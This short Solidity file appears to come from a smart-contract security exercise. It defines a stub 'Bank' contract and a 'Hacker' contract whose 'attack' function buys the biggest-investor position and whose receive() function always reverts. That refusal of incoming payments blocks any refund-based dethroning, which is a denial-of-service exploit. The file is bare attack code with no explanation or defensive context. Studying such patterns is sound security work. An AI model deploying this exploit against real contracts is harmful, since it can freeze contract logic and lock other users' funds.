// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.8;

contract Bank{
    function tryToBeBiggestInvestor() public payable{}
}

contract Hacker{

    function attack(address _addr) public payable{
        Bank(_addr).tryToBeBiggestInvestor{value: msg.value}();
    }

    receive() external payable {
        revert();
    }
}